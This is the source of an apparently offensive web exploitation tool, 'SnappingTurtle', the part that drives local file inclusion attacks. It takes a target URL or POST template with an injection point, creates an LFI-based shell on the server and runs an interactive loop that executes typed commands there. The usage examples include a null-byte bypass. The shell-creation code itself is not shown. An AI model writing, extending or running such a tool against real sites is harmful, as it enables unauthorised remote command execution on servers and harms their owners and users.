class ShellCommand {
    Quit: 'quit',
};

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        switch (cmd) {
            ShellCommand.Quit: {
                print('Exiting');
                quit();
            }
            default: cmd |> shell.run |> print;
        }
    }
};

if (hasArgs) {
    shell = null;
    switch (args.Mode) {
        ClassOption.Lfi: {
            print('Exploiting LFI');
            shell = LfiShell(args.Url, args.Post);
            
            if (!shell.create()) {
                print('Failed to create shell, exiting');
                quit();
            }
        }
        
        default: {
            print('Invalid mode: %s' % args.Mode);
            quit();
        }
    }

    shellLoop(shell);
} else {
    print('SnappingTurtle Web Exploitation Tool 0.1.' + __BUILD__);
    print('AutoSec Tools - http://autosectools.com/\r\n');
    print('python st.py [mode (required)] [url(required)] [options]\r\n');
    print('# Modes\r\n');
    print('  -lfi               Local file inclusion\r\n');
    print('# Url\r\n');
    print('  Url template. Use %s to inject.\r\n');
    print('# Options\r\n');
    print('  -p {post data}     Post data is Python map format. Use %s to inject.');
    print('');
    print('# Examples\r\n');
    print('  python st.py -lfi http://localhost/test.php?theme=%s\r\n');
    print('  python st.py -lfi http://localhost/test.php?theme=%s%%00\r\n');
    print('  python st.py -lfi http://localhost/postTest.php -p "{\'theme\':\'%s\'}"\r\n');
}
